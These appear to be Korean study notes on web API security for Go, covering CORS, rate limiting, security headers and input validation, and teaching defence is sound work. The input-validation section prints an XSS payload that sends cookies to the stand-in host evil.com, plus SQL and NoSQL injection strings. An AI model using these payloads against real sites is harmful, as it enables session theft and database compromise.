### CORS

웹 페이지가 다른 도메인의 API를 호출하면 브라우저가 이를 차단합니다.


Simple Request
 - GET, HEAD, POST 요청 중 특정 조건을 만족하면 바로 요청이 전송

Preflight Request
 - PUT, DELETE 요청이나 커스텀 헤더가 포함된 요청은 먼저 OPTIONS 요청을 보내서 서버가 허용하는지 확인

헤더	설명
```
Access-Control-Allow-Origin	허용된 Origin
Access-Control-Allow-Methods	허용된 HTTP 메서드
Access-Control-Allow-Headers	허용된 요청 헤더
Access-Control-Expose-Headers	클라이언트가 접근 가능한 응답 헤더
Access-Control-Allow-Credentials	인증 정보 포함 허용 여부
Access-Control-Max-Age	Preflight 캐시 시간 (초)
```

### Rate Limiting

go get golang.org/x/time/rate


일정 시간 동안 허용하는 요청 수를 제한 -> API 남용, DDoS 공격, 서버 과부하를 방지

```
Fixed Window      고정된 시간 창에서 요청 수를 카운트합니다. 구현이 간단하지만 창 경계에서 요청이 몰리면 순간적으로 2배 허용됩니다.
Sliding Window    시간 창이 움직이며 더 정확하게 제한합니다. Fixed Window의 경계 문제를 해결합니다.
Token Bucket      토큰이 일정 속도로 채워지고, 요청마다 토큰을 소비합니다. 버스트 트래픽을 유연하게 처리할 수 있습니다.
Leaky Bucket      물이 새는 양동이처럼 일정한 속도로만 요청을 처리합니다. 트래픽을 균등하게 분산합니다.
```



### 보안 헤더

```yaml
X-Content-Type-Options
브라우저가 MIME 타입을 추측하지 않도록 합니다. MIME 스니핑 공격을 방지합니다.

X-Content-Type-Options: nosniff
X-Frame-Options
페이지가 iframe에 포함되는 것을 제한합니다. 클릭재킹 공격을 방지합니다.

X-Frame-Options: DENY              # iframe 포함 금지
X-Frame-Options: SAMEORIGIN        # 같은 도메인에서만 허용
X-XSS-Protection
브라우저의 XSS 필터를 활성화합니다. 최신 브라우저에서는 CSP로 대체되었지만 구형 브라우저를 위해 설정합니다.

X-XSS-Protection: 1; mode=block
Strict-Transport-Security (HSTS)
HTTPS 연결만 허용합니다. 중간자 공격을 방지합니다.

Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy (CSP)
리소스 로딩 정책을 정의합니다. XSS 공격을 효과적으로 방지합니다.

Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
Referrer-Policy
Referer 헤더 전송 정책을 정의합니다. 민감한 URL 정보 노출을 방지합니다.

Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy
브라우저 기능 사용 권한을 정의합니다.

Permissions-Policy: geolocation=(), microphone=(), camera=()
```

입력값 검증
```
XSS (Cross-Site Scripting)
악성 스크립트를 삽입해서 다른 사용자의 브라우저에서 실행되게 합니다.

<!-- 공격자가 입력한 게시글 제목 -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
SQL Injection
SQL 구문을 삽입해서 데이터베이스를 조작합니다.

-- 공격자가 입력한 사용자 이름
admin' OR '1'='1
NoSQL Injection
MongoDB 같은 NoSQL 데이터베이스에서도 비슷한 공격이 가능합니다.

{"username": {"$gt": ""}, "password": {"$gt": ""}}
```


```yaml
// 안전 - 파라미터 바인딩 사용
db.Where("username = ?", username).First(&user)

// 위험 - 문자열 연결
db.Where("username = '" + username + "'").First(&user) // 절대 금지!

// 안전 - Raw SQL도 파라미터 바인딩
db.Raw("SELECT * FROM users WHERE username = ?", username).Scan(&user)

// 안전 - 이름 있는 파라미터
db.Where("username = @name", sql.Named("name", username)).First(&user)
```

종합 보안 체크리스트
```
항목	방법

XSS 방지	입력 정제 + 출력 이스케이프
SQL Injection 방지	파라미터 바인딩 사용
CSRF 방지	CSRF 토큰 검증
파일 업로드	MIME 타입 검증, 확장자 제한
인증	강력한 비밀번호 정책, MFA
세션	HttpOnly, Secure 쿠키
```